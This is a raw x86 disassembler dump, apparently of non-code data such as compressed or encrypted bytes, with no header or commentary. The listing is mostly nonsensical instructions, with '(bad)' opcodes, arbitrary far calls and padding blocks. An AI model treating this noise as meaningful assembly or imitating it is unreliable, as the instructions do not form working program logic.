  4224f4:	pop    ebx
  4224f5:	stc    
  4224f6:	dec    esp
  4224f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224f8:	push   0xffffff9e
  4224fa:	out    0x5a,al
  4224fc:	idiv   BYTE PTR [ebx]
  4224fe:	xchg   DWORD PTR [ebx+edx*4],esi
  422501:	(bad)  [ebx-0x70442a7d]
  422507:	cmp    ecx,DWORD PTR [eax-0x6d2c8bc2]
  42250d:	aam    0xef
  42250f:	pop    es
  422510:	sbb    al,0xd
  422512:	sub    ebx,DWORD PTR [ebx+0xc]
  422515:	cmp    dh,BYTE PTR [ecx]
  422517:	leave  
  422518:	adc    BYTE PTR [ebx-0x623437a3],0xa8
  42251f:	jnp    0x422535
  422521:	vpmaxub ymm0,ymm7,YMMWORD PTR [ecx]
  422525:	hlt    
  422526:	shl    BYTE PTR [edx+0x46],cl
  422529:	mov    ds:0x1b49dc04,al
  42252e:	(bad)  
  42252f:	cli    
  422530:	and    BYTE PTR [ecx-0x35],cl
  422533:	xchg   edi,esi
  422535:	or     DWORD PTR [ebx-0x31fbf951],0x9adff738
  42253f:	das    
  422540:	sahf   
  422541:	jle    0x422575
  422543:	pop    esp
  422544:	sub    DWORD PTR [eax-0x43],edx
  422547:	pop    ecx
  422548:	adc    ch,BYTE PTR ds:0xaa50dd36
  42254e:	fidivr DWORD PTR [ecx-0x13b02c46]
  422554:	loope  0x42255e
  422556:	or     al,0xcd
  422558:	mov    DWORD PTR [edi-0x11],ecx
  42255b:	jne    0x4224e9
  42255d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42255f:	or     BYTE PTR [esi+0x68e5e352],ah
  422565:	popf   
  422566:	ret    0x79b
  422569:	test   al,0xc3
  42256b:	cli    
  42256c:	es std 
  42256e:	jno    0x422598
  422570:	push   ecx
  422571:	stos   DWORD PTR es:[edi],eax
  422572:	mul    BYTE PTR [ecx+eax*2]
  422575:	arpl   bp,ax
  422577:	ins    DWORD PTR es:[edi],dx
  422578:	sbb    al,0xf3
  42257a:	mov    bh,0xc9
  42257c:	pop    esi
  42257d:	mov    dl,0x87
  42257f:	in     al,dx
  422580:	fwait
  422581:	mov    dh,0x53
  422583:	inc    ecx
  422584:	pusha  
  422585:	outs   dx,BYTE PTR ds:[esi]
  422586:	pop    ebp
  422587:	mov    WORD PTR [ebx-0x7b],es
  42258a:	jmp    0x1da11b19
  42258f:	push   esi
	...
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x15755d08]
  422602:	sti    
  422603:	jne    0x422649
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    al,0x1
  42260a:	add    BYTE PTR [eax],al
  42260c:	or     DWORD PTR [esi],ebx
  42260e:	sbb    ebx,esi
  422610:	repz mov al,ds:0x1355c672
  422616:	mov    edi,0x2c3dd124
  42261b:	xor    ecx,0x73
  42261e:	mov    BYTE PTR [ebp+0x130eda23],dl
  422624:	xchg   esp,eax
  422625:	jmp    0x4225ad
  422627:	inc    ebp
  422628:	pop    ds
  422629:	ja     0x422672
  42262b:	xchg   ecx,eax
  42262c:	jb     0x4225b5
  42262e:	cli    
  42262f:	std    
  422630:	ret    0x4978
  422633:	scas   eax,DWORD PTR es:[edi]
  422634:	xchg   ebp,eax
  422635:	gs (bad) 
  422637:	fcmovne st,st(1)
  422639:	out    0x80,al
  42263b:	out    dx,al
  42263c:	mov    ch,0x5e
  42263e:	jne    0x422624
  422640:	push   ebp
  422641:	repnz pop esi
  422643:	fidivr WORD PTR [edx]
  422645:	das    
  422646:	std    
  422647:	cdq    
  422648:	jnp    0x422638
  42264a:	adc    ch,BYTE PTR [ebx-0x2196038b]
  422650:	test   BYTE PTR [edx+0x79],0x1f
  422654:	mov    cs,WORD PTR [ebp-0x70]
  422657:	push   esp
  422658:	icebp  
  422659:	outs   dx,DWORD PTR ds:[esi]
  42265a:	mov    dl,0x88
  42265c:	jecxz  0x42260b
  42265e:	sub    ebx,DWORD PTR [bp+0xd3e]
  422663:	test   eax,0x76dacf79
  422668:	cmp    DWORD PTR [ebp+0x57],edi
  42266b:	jl     0x4226c3
  42266d:	fsubr  DWORD PTR [eax]
  42266f:	sti    
  422670:	push   edx
  422671:	test   eax,0x72bb3466
  422676:	js     0x4226f0
  422678:	pop    esi
  422679:	out    0xea,al
  42267b:	retf   0x39aa
  42267e:	aad    0x28
  422680:	xor    DWORD PTR [esi+eiz*2+0x3],ecx
  422684:	les    edx,FWORD PTR [ebx-0x10dc41f4]
  42268a:	mov    esp,esp
  42268c:	jb     0x4226f2
  42268e:	xor    ch,BYTE PTR [ecx-0xc]
  422691:	jp     0x42262d
  422693:	or     eax,DWORD PTR [edi]
  422695:	or     eax,0xfe2be4ae
  42269a:	mov    esp,DWORD PTR [ebx]
  42269c:	into   
  42269d:	jg     0x422713
  42269f:	cmp    eax,0xb9bcb107
  4226a4:	clc    
  4226a5:	sub    dl,cl
  4226a7:	shl    BYTE PTR [ecx-0x6c],0xce
  4226ab:	jl     0x4226aa
  4226ad:	cdq    
  4226ae:	xor    BYTE PTR [ebp+eax*2+0x7561c86f],dl
  4226b5:	test   DWORD PTR [ebx+0x75],edi
  4226b8:	in     eax,dx
  4226b9:	and    eax,0x6a5e1a75
  4226be:	out    dx,eax
  4226bf:	cmp    eax,0xade0ef6
  4226c4:	div    DWORD PTR [esi]
  4226c6:	xchg   edx,eax
  4226c7:	or     DWORD PTR [ecx],ebx
  4226c9:	push   0xffffffa4
  4226cb:	mov    ch,BYTE PTR [esi+0x72]
  4226ce:	cmp    ecx,eax
  4226d0:	or     bl,BYTE PTR [ecx+0x52a649ea]
  4226d6:	sbb    ch,BYTE PTR [edx+0x5e2588ae]
  4226dc:	push   ecx
  4226dd:	call   0x1ac3:0xac700fb
  4226e4:	add    BYTE PTR [ecx+ebp*1],bh
  4226e7:	stos   DWORD PTR es:[edi],eax
  4226e8:	icebp  
  4226e9:	in     al,0x9
  4226eb:	scas   al,BYTE PTR es:[edi]
  4226ec:	jbe    0x4226ae
  4226ee:	jecxz  0x4226e2
  4226f0:	jl     0x422707
  4226f2:	dec    edx
  4226f4:	or     DWORD PTR [ebp-0x31],edx
  4226f7:	mov    ?,WORD PTR [eax+ebx*2+0x49a2526e]
  4226fe:	mov    dl,0x18
  422700:	(bad)  
  422701:	scas   eax,DWORD PTR es:[edi]
  422702:	mov    ah,0x7f
  422704:	(bad)  [eax+ebx*4]
  422707:	(bad)  
  422708:	pop    esp
  422709:	pop    edx
  42270a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42270b:	mov    dl,0x1
  42270d:	xchg   esi,eax
  42270e:	cli    
  42270f:	retf   0x0
	...
  422772:	add    BYTE PTR [eax],al
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0xa77f01c8
  422781:	sub    BYTE PTR [edi+0x16f4875],bl
  422787:	add    BYTE PTR [ecx+eax*1],al
  42278a:	add    BYTE PTR [eax],al
  42278c:	adc    bh,BYTE PTR [edi]
  42278e:	sbb    BYTE PTR [eax-0x6561f632],dl
  422794:	std    
  422795:	mov    edx,0x41780a0c
  42279a:	mov    ebp,0x1c8c21be
  42279f:	dec    esp
  4227a0:	and    al,0x39
  4227a2:	adc    edi,edi
  4227a4:	or     ecx,edi
  4227a6:	mov    eax,ds:0x1693d8e9
  4227ab:	das    
  4227ac:	adc    ebp,DWORD PTR [ecx+0x314d7698]
  4227b2:	pop    eax
  4227b3:	ds push eax
  4227b5:	int3   
  4227b6:	xor    eax,0x79d1bde0
  4227bb:	scas   eax,DWORD PTR es:[edi]
  4227bc:	(bad)  
  4227be:	out    0xd6,al
  4227c0:	shr    BYTE PTR [ecx],cl
  4227c2:	call   0x51bb:0xfafb25ef
  4227c9:	outs   dx,BYTE PTR ds:[esi]
  4227ca:	add    BYTE PTR [edx],dl
  4227cc:	inc    eax
  4227cd:	adc    BYTE PTR [ecx],bh
  4227cf:	inc    ebp
  4227d0:	xchg   BYTE PTR [ebx-0x620a16e8],ch
  4227d6:	add    DWORD PTR [esp+ebx*1+0x1b8a1bdb],eax
  4227dd:	mov    ah,0x31
  4227df:	or     eax,0x9ad167a
  4227e4:	or     ah,BYTE PTR [ebx+0x6c94ad1]
  4227ea:	xchg   edx,eax
  4227eb:	shr    BYTE PTR [ebx+0x4d],cl
  4227ee:	ror    DWORD PTR [eax],cl
  4227f0:	popa   
  4227f1:	xchg   esi,eax
  4227f2:	cli    
  4227f3:	inc    esp
  4227f4:	adc    BYTE PTR [esi],dh
  4227f6:	jnp    0x422837
  4227f8:	ja     0x422818
  4227fa:	call   0xe715:0x6c8b5c9b
  422801:	lods   eax,DWORD PTR ds:[esi]
  422802:	clc    
  422803:	add    ebp,DWORD PTR [edx]
  422805:	test   eax,0x931e4b3
  42280a:	add    eax,0xc5b6c03f
  42280f:	std    
  422810:	push   edi
  422811:	xor    BYTE PTR [ecx],bl
  422813:	push   es
  422814:	pop    ebp
  422815:	push   ecx
  422816:	es mov esp,0xd13d9ab0
  42281c:	pop    ebp
  42281d:	fsub   QWORD PTR [ecx]
  42281f:	scas   eax,DWORD PTR es:[edi]
  422820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422821:	jle    0x4227fa
  422823:	icebp  
  422824:	jmp    ebp
  422826:	popa   
  422827:	dec    esi
  422828:	jge    0x4227d1
  42282a:	and    BYTE PTR [eax+0x22],cl
  42282d:	arpl   WORD PTR cs:[ebx],cx
  422830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422831:	dec    ecx
  422832:	and    eax,0xd14d0767
  422837:	push   edi
  422838:	inc    edi
  422839:	pop    esi
  42283a:	arpl   sp,dx
  42283c:	push   esp
  42283d:	add    al,0x36
  42283f:	cmp    BYTE PTR [ebx+ebp*8],0xd9
  422843:	and    ebx,DWORD PTR [edx-0x423acf9e]
  422849:	cwde   
  42284a:	or     ecx,esp
  42284c:	push   edi
  42284d:	bound  ebx,QWORD PTR [ebx-0x765ef157]
  422853:	mov    edx,0xd4399e91
  422858:	jmp    0x43cc850a
  42285d:	pop    eax
  42285e:	es xor eax,0xd15aee20
  422864:	aas    
  422865:	mov    ebx,0x1773d2ff
  42286a:	popa   
  42286b:	push   ebp
  42286c:	fcom   QWORD PTR es:[esi]
  42286f:	mov    edi,0xe3e684eb
  422874:	pop    es
  422875:	out    dx,al
  422876:	mov    dl,0xb6
  422878:	sbb    ebp,DWORD PTR [edi-0x7e]
  42287b:	xor    al,BYTE PTR [ebx-0x4e2e859]
  422881:	fdivr  st(0),st
  422883:	push   ebp
  422884:	(bad)  
  422885:	out    dx,al
  422886:	push   eax
  422887:	push   cs
  422888:	push   0x5af0e007
  42288d:	lahf   
  42288e:	or     BYTE PTR [ebx+0x0],dh
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x42291d
  422901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422902:	pop    edx
  422903:	xor    eax,0x1704c
  422908:	add    al,0x1
  42290a:	add    BYTE PTR [eax],al
  42290c:	pop    edi
  42290d:	mov    BYTE PTR [esp+ecx*8],dh
  422910:	and    BYTE PTR [esi+0x33],al
  422913:	sbb    ah,BYTE PTR [esi-0x40e45f88]
  422919:	add    BYTE PTR [esi+0x25],bh
  42291c:	cmp    esp,DWORD PTR [eax+0x21]
  42291f:	nop
  422920:	and    al,0xe8
  422922:	ss jp  0x422953
  422925:	sbb    esp,ecx
  422927:	dec    edx
  422928:	pop    esp
  422929:	cli    
  42292a:	push   esp
  42292b:	daa    
  42292c:	dec    esi
  42292d:	cmp    ch,dh
  42292f:	or     BYTE PTR [ebx+0x22],0x6a
  422933:	push   0x5093fefc
  422938:	dec    ebp
  422939:	or     ebp,DWORD PTR [eax+ebp*8]
  42293c:	inc    edx
  42293d:	mov    ah,0xbe
  42293f:	sbb    al,0xbe
  422941:	push   ds
  422942:	push   0xfc5f1fb1
  422947:	(bad)  
  422948:	into   
  422949:	push   edx
  42294a:	adc    bh,BYTE PTR [ebx-0xecc19f7]
  422950:	cmp    al,0xec
  422952:	mov    BYTE PTR [ecx],bh
  422954:	jbe    0x422940
  422956:	sbb    dl,cl
  422958:	push   ds
  422959:	mov    ds:0x976ac55f,al
  42295e:	dec    edi
  42295f:	aas    
  422960:	pop    ss
  422961:	std    
  422962:	out    dx,al
  422963:	bswap  edx
  422965:	mov    dl,0xb2
  422967:	test   BYTE PTR [esp+ebp*1],dl
  42296a:	pop    es
  42296b:	cmp    esi,DWORD PTR [eax-0x4cc65e19]
  422971:	mov    ch,0x82
  422973:	or     al,dh
  422975:	rcl    BYTE PTR [eax+0x42814d54],cl
  42297b:	mov    esi,esi
  42297d:	inc    esp
  42297e:	add    eax,edi
  422980:	gs push ecx
  422982:	adc    eax,0x6aebe4f6
  422987:	cmp    ch,BYTE PTR [ebx+ebx*8-0x1887e3aa]
  42298e:	jmp    0xd74b:0x9f64fd78
  422995:	inc    ebp
  422996:	enter  0x8582,0x2c
  42299a:	mov    ah,0xad
  42299c:	js     0x42293c
  42299e:	sub    al,BYTE PTR [ebx+esi*8+0x77]
  4229a2:	jns    0x4229af
  4229a4:	pusha  
  4229a5:	in     al,0x21
  4229a7:	jge    0x42298d
  4229a9:	cwde   
  4229aa:	dec    edx
  4229ab:	je     0x4229de
  4229ad:	jmp    0x282e:0xae9f9688
  4229b4:	dec    BYTE PTR [ebp+ecx*8+0xd]
  4229b8:	push   ebp
  4229b9:	into   
  4229ba:	push   es
  4229bb:	shl    edx,0x21
  4229be:	mov    ds,WORD PTR [edi+ecx*2+0x41]
  4229c2:	sbb    DWORD PTR [eax+0x4],esp
  4229c5:	test   al,0x4a
  4229c7:	xlat   BYTE PTR ds:[ebx]
  4229c8:	icebp  
  4229c9:	les    esp,FWORD PTR [edx]
  4229cb:	push   ds
  4229cc:	sub    eax,0x9deef41f
  4229d1:	add    cl,dh
  4229d3:	out    dx,al
  4229d4:	aas    
  4229d5:	mov    edx,0x3df7b1b3
  4229da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229db:	cld    
  4229dc:	or     eax,0xea7c9750
  4229e1:	gs dec ebx
  4229e3:	xor    al,0x3a
  4229e5:	pushf  
  4229e6:	mov    ds:0xa3bcbdf8,eax
  4229eb:	ss fwait
  4229ed:	repnz cmp al,0x8
  4229f0:	or     BYTE PTR [edi-0x13],dh
  4229f3:	jnp    0x422977
  4229f5:	cmp    bl,BYTE PTR [esi+ebx*8+0x4b]
  4229f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229fa:	fs dec ecx
  4229fc:	or     edi,esi
  4229fe:	inc    ebp
  4229ff:	cmp    al,0x85
  422a01:	scas   al,BYTE PTR es:[edi]
  422a02:	jb     0x422a72
  422a04:	push   edi
  422a05:	add    BYTE PTR [ebx],bh
  422a07:	fcom   DWORD PTR [edx+eiz*2+0x27]
  422a0b:	xchg   esi,eax
  422a0c:	jle    0x422a74
  422a0e:	cld    
  422a0f:	fld    DWORD PTR [eax]
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	pop    ecx
  422a81:	adc    BYTE PTR [eax+0x6c],al
  422a84:	push   eax
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR [ecx+eax*1],al
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	pop    ebp
  422a8d:	or     al,0xe2
  422a8f:	xchg   ebx,edi
  422a91:	xchg   ecx,eax
  422a92:	jge    0x422ab2
  422a94:	mul    edx
  422a96:	sbb    ebx,edi
  422a98:	lea    ebp,[ebp-0x9]
  422a9b:	or     bl,dl
  422a9d:	xchg   edi,eax
  422a9e:	leave  
  422a9f:	dec    ebp
  422aa0:	xchg   esi,eax
  422aa1:	xchg   esi,eax
  422aa2:	push   ds
  422aa3:	xchg   esi,eax
  422aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422aa5:	and    DWORD PTR [ebp+0x13],eax
  422aa8:	mov    dl,0x92
  422aaa:	pusha  
  422aab:	hlt    
  422aac:	cmp    dl,bh
  422aae:	push   cs
  422aaf:	inc    esi
  422ab0:	xchg   al,dl
  422ab2:	jmp    0x5967:0x77e43801
  422ab9:	inc    ecx
  422aba:	jae    0x422a72
  422abc:	out    0xde,al
  422abe:	lods   al,BYTE PTR ds:[esi]
  422abf:	pop    ecx
  422ac0:	lods   al,BYTE PTR ds:[esi]
  422ac1:	pop    ds
  422ac2:	and    ecx,DWORD PTR [esi]
  422ac4:	retf   0x900a
  422ac7:	mov    ah,0x86
  422ac9:	fwait
  422aca:	xor    esi,ebp
  422acc:	xlat   BYTE PTR ds:[ebx]
  422acd:	xchg   ecx,eax
  422ace:	ins    DWORD PTR es:[edi],dx
  422acf:	and    BYTE PTR [esi+0x14],0x1b
  422ad3:	adc    al,0xc7
  422ad5:	das    
  422ad6:	daa    
  422ad7:	mov    eax,0x3c325485
  422adc:	mov    ebp,fs
  422ade:	xchg   esp,eax
  422adf:	mov    bl,0x8d
  422ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ae2:	push   es
  422ae3:	push   esi
  422ae4:	cmp    edi,ecx
  422ae6:	adc    DWORD PTR [ecx+0x75],edx
  422ae9:	sub    eax,0x64d74489
  422aee:	(bad)  
  422af0:	in     al,0x7d
  422af2:	xchg   esi,eax
  422af3:	cmc    
  422af4:	jb     0x422b65
  422af6:	mov    edx,0xa7ab2ae5
  422afb:	ja     0x422b10
  422afd:	pop    ds
  422afe:	ja     0x422b4d
  422b00:	shr    BYTE PTR ds:0x7796c9d3,cl
  422b06:	das    
  422b07:	out    dx,al
  422b08:	int3   
  422b09:	push   es
  422b0a:	(bad)  
  422b0b:	scas   al,BYTE PTR es:[edi]
  422b0c:	sub    eax,0x4679b1b0
  422b11:	jle    0x422b24
  422b13:	ja     0x422b62
  422b15:	sbb    bl,ch
  422b17:	xlat   BYTE PTR ds:[ebx]
  422b18:	frndint 
  422b1a:	ds sub eax,0xb24b95b
  422b20:	fdiv   DWORD PTR [edi+0xf7a20dc]
  422b26:	jnp    0x422aeb
  422b28:	out    0x19,al
  422b2a:	int    0xf3
  422b2c:	push   ebp
  422b2d:	xchg   BYTE PTR [eax+esi*8+0x68],bh
  422b31:	inc    edx
  422b32:	pop    ecx
  422b33:	retf   0xc424
  422b36:	jbe    0x422b63
  422b38:	mov    ds:0x2b229349,al
  422b3d:	out    dx,eax
  422b3e:	outs   dx,DWORD PTR ds:[esi]
  422b3f:	addr16 mov ss:0x90ff,eax
  422b44:	daa    
  422b45:	(bad)  
  422b47:	xchg   ebp,eax
  422b48:	ds je  0x422b97
  422b4b:	xor    BYTE PTR [ebp-0x15],ah
  422b4e:	loope  0x422bab
  422b50:	popa   
  422b51:	aas    
  422b52:	adc    al,0x91
  422b54:	or     DWORD PTR ds:0xb65c185a,esp
  422b5a:	cmp    eax,0x3cf212bb
  422b5f:	dec    ebx
  422b60:	cdq    
  422b61:	and    BYTE PTR [ebx-0x5796718e],ah
  422b67:	cmp    eax,0xe5e355aa
  422b6c:	sub    cl,BYTE PTR [ebp-0xe]
  422b6f:	push   ss
  422b70:	pop    ecx
  422b71:	fidiv  DWORD PTR [ebx+edx*4]
  422b74:	pop    ebx
  422b75:	lds    ebp,FWORD PTR [ebx-0x1f57897]
  422b7b:	or     DWORD PTR fs:[esi+ebp*4-0x47],0xc21063b7
  422b84:	test   DWORD PTR [eax-0x24f3567e],ebx
  422b8a:	mov    dh,BYTE PTR [edi]
  422b8c:	mov    al,0x63
  422b8e:	pop    ebp
  422b8f:	jmp    0x422b91
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x326eb264]
  422c02:	sar    BYTE PTR [edi+0x54],1
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	and    bl,BYTE PTR [edi]
  422c0e:	mov    dh,0x6d
  422c10:	push   0xe69ca6e4
  422c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c16:	dec    esp
  422c17:	popa   
  422c18:	in     al,dx
  422c19:	enter  0xbafa,0x35
  422c1d:	xor    eax,ebx
  422c1f:	ins    BYTE PTR es:[edi],dx
  422c20:	sbb    al,0x16
  422c22:	fs mov gs,ecx
  422c25:	or     BYTE PTR [ebx+edi*8+0x72f5b620],dl
  422c2c:	sti    
  422c2d:	lock bound edi,QWORD PTR [ebp+0x2bd3faa]
  422c34:	pop    edx
  422c35:	lea    edx,[esi+0x124d24aa]
  422c3b:	aam    0xc
  422c3d:	xchg   DWORD PTR ds:0xaa0639f1,eax
  422c43:	int    0x29
  422c45:	or     ch,BYTE PTR ds:0x44cba409
  422c4b:	dec    ecx
  422c4c:	mov    DWORD PTR [edx],ebp
  422c4e:	add    DWORD PTR [ecx-0x2e],0x9
  422c52:	push   ecx
  422c53:	sti    
  422c54:	popf   
  422c55:	mov    dl,0x9d
  422c57:	push   ebp
  422c58:	xor    DWORD PTR [ebx-0x48a03863],edx
  422c5e:	div    cl
  422c60:	dec    ebx
  422c61:	scas   al,BYTE PTR es:[edi]
  422c62:	or     al,0x69
  422c64:	adc    al,0x6
  422c66:	pop    esi
  422c67:	das    
  422c68:	cmc    
  422c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c6a:	(bad)  
  422c6b:	jb     0x422cc3
  422c6d:	and    edx,ecx
  422c6f:	outs   dx,DWORD PTR ds:[esi]
  422c70:	add    DWORD PTR [ecx-0x7a],ecx
  422c73:	pop    ebx
  422c74:	cmp    ch,bl
  422c76:	stos   DWORD PTR es:[edi],eax
  422c77:	call   0x40fb212c
  422c7c:	fwait
  422c7d:	lock jae 0x422c30
  422c80:	adc    edx,DWORD PTR [edi-0x54f78311]
  422c86:	xchg   DWORD PTR [ecx],edx
  422c88:	retf   
  422c89:	cmp    al,0x2f
  422c8b:	dec    esi
  422c8c:	call   0x67e582bf
  422c91:	(bad)  
  422c92:	sbb    al,BYTE PTR [edx]
  422c94:	psubq  mm7,mm5
  422c97:	div    DWORD PTR [ebx]
  422c99:	and    eax,0xd33cf4bf
  422c9e:	mov    ds:0x14a9b0f,eax
  422ca3:	adc    eax,0xd1becbcb
  422ca8:	xchg   edx,eax
  422ca9:	xlat   BYTE PTR ds:[ebx]
  422caa:	fist   WORD PTR ds:0x91da31ed
  422cb0:	push   cs
  422cb1:	loop   0x422cb0
  422cb3:	fcomp  QWORD PTR [ecx]
  422cb5:	dec    ecx
  422cb6:	pop    ds
  422cb7:	outs   dx,BYTE PTR ds:[esi]
  422cb8:	lods   al,BYTE PTR ss:[esi]
  422cba:	je     0x422d21
  422cbc:	jae    0x422c96
  422cbe:	sub    DWORD PTR [esp],eax
  422cc1:	mov    al,ds:0x9bb5b037
  422cc6:	dec    ebp
  422cc7:	sbb    al,0x10
  422cc9:	mov    esi,DWORD PTR [ebx]
  422ccb:	dec    ebx
  422ccc:	push   ss
  422ccd:	call   DWORD PTR [ebp+0x75]
  422cd0:	out    0x5e,al
  422cd2:	add    cl,BYTE PTR [edi-0x18]
  422cd5:	add    eax,0xbc4ef628
  422cda:	pop    eax
  422cdb:	inc    ecx
  422cdc:	jecxz  0x422cf6
  422cde:	push   ss
  422cdf:	repz pop esp
  422ce1:	mov    bl,0x55
  422ce3:	mov    ch,0x73
  422ce5:	lock outs dx,DWORD PTR ds:[esi]
  422ce7:	fmul   QWORD PTR [esi+0x402f9067]
  422ced:	pop    es
  422cee:	fld    TBYTE PTR [ebx]
  422cf0:	pop    edx
  422cf2:	hlt    
  422cf3:	push   ss
  422cf4:	or     BYTE PTR [edi-0x60d14a2a],ah
  422cfa:	jae    0x422d25
  422cfc:	mov    ecx,0x379b8e91
  422d01:	mov    ss,WORD PTR [ebx+0x76e0ac3b]
  422d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d08:	lahf   
  422d09:	cmp    ebp,esp
  422d0b:	cmp    DWORD PTR [edx+0xd01b5c],esi
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ebp,DWORD PTR [esi]
  422d81:	loope  0x422d4d
  422d83:	(bad)  
  422d84:	pop    eax
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR [ecx+eax*1],al
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	sbb    edi,eax
  422d8e:	or     BYTE PTR [esi-0x28],dh
  422d91:	(bad)  
  422d92:	add    esp,DWORD PTR [esi]
  422d94:	aas    
  422d95:	xor    BYTE PTR [eax],dl
  422d97:	test   eax,0x1c485e2b
  422d9c:	(bad)  
  422d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d9f:	loope  0x422d5b
  422da1:	mov    al,ds:0xf166f7b1
  422da6:	adc    al,0x65
  422da8:	or     BYTE PTR [edx],0x94
  422dab:	and    eax,0x9780b6a9
  422db0:	(bad)  
  422db1:	je     0x422d4a
  422db3:	mov    WORD PTR [ebx+eiz*4-0x5b],?
  422db7:	jnp    0x422d4d
  422db9:	lahf   
  422dba:	pop    es
  422dbb:	int    0xa9
  422dbd:	push   eax
  422dbe:	sar    DWORD PTR [eax+0x9],1
  422dc1:	lods   al,BYTE PTR ds:[esi]
  422dc2:	and    eax,0x74a2e9c4
  422dc7:	xor    BYTE PTR [eax-0x54],bl
  422dca:	push   ebx
  422dcb:	(bad)  
  422dcc:	dec    DWORD PTR [eax+0x35]
  422dcf:	cmp    DWORD PTR [eax-0x384d2ab2],0x63b22ec4
  422dd9:	cdq    
  422dda:	xchg   DWORD PTR [edx-0x53],ecx
  422ddd:	xor    ebx,esi
  422ddf:	mov    al,ds:0xd3616714
  422de4:	xor    eax,0x657ad881
  422de9:	mov    eax,ds:0xca02777a
  422dee:	pop    ecx
  422def:	fst    QWORD PTR [ecx+0xf7bafd7]
  422df5:	(bad)  
  422df6:	scas   eax,DWORD PTR es:[edi]
  422df7:	push   esi
  422df8:	(bad)
  422dfb:	add    BYTE PTR [edx-0x761a1992],ch
  422e01:	lods   eax,DWORD PTR ds:[esi]
  422e02:	pop    ds
  422e03:	mov    bl,0x18
  422e05:	adc    al,0x7d
  422e07:	fsub   DWORD PTR [ecx+eax*2]
  422e0a:	and    edx,DWORD PTR [ebx-0x24dc2b8f]
  422e10:	adc    eax,0x29688eec
  422e15:	int    0xd6
  422e17:	addr16 (bad) 
  422e19:	and    al,0x4
  422e1b:	aaa    
  422e1c:	lahf   
  422e1d:	pop    eax
  422e1e:	inc    esp
  422e1f:	es or  edx,edi
  422e22:	inc    edi
  422e23:	enter  0x217c,0x8b
  422e27:	adc    BYTE PTR [edi+0x409f05f9],0x40
  422e2e:	jg     0x422dc7
  422e30:	jg     0x422de9
  422e32:	mov    al,ds:0x7431d5d8
  422e37:	aad    0xfc
  422e39:	or     eax,0xec867696
  422e3e:	jae    0x422e85
  422e40:	push   0x762ec636
  422e45:	xchg   edi,eax
  422e46:	mov    bl,0x84
  422e48:	mov    ebx,0x385e72a2
  422e4d:	push   ds
  422e4e:	ss dec ecx
  422e50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e51:	xchg   DWORD PTR [eax-0x3d],edi
  422e54:	shl    DWORD PTR [esi+0xac3911b],cl
  422e5a:	addr16 mov edx,0x40af6bad
  422e60:	push   ds
  422e61:	pop    es
  422e62:	push   0x63
  422e64:	fwait
  422e65:	adc    ecx,DWORD PTR ds:0x8708c2e8
  422e6b:	cmp    eax,ebp
  422e6d:	adc    ah,al
  422e6f:	xchg   ebp,eax
  422e70:	xchg   esi,eax
  422e71:	dec    esp
  422e72:	in     eax,0x3c
  422e74:	mov    WORD PTR ds:0x381302a4,?
  422e7a:	push   ds
  422e7b:	and    DWORD PTR [edi-0x7a],esi
  422e7e:	adc    dl,BYTE PTR [esi-0x3f5b97b1]
  422e84:	xchg   esp,eax
  422e85:	repnz icebp 
  422e87:	popf   
  422e88:	fsubr  DWORD PTR [ebp+esi*2+0x30]
  422e8c:	lock dec ebp
  422e8e:	fidivr DWORD PTR [ebx+0x0]
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0xf499
  422f02:	cmp    eax,0x1745c13
  422f07:	add    BYTE PTR [ecx+eax*1],al
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	outs   dx,BYTE PTR gs:[esi]
  422f0e:	out    dx,al
  422f0f:	sahf   
  422f10:	loope  0x422f6d
  422f12:	aaa    
  422f13:	out    dx,eax
  422f14:	cdq    
  422f15:	mov    ds:0x9cbb0ce4,eax
  422f1a:	mov    ch,0xeb
  422f1c:	std    
  422f1d:	adc    ah,ch
  422f1f:	pop    edi
  422f20:	(bad)  
  422f21:	retf   0x39f9
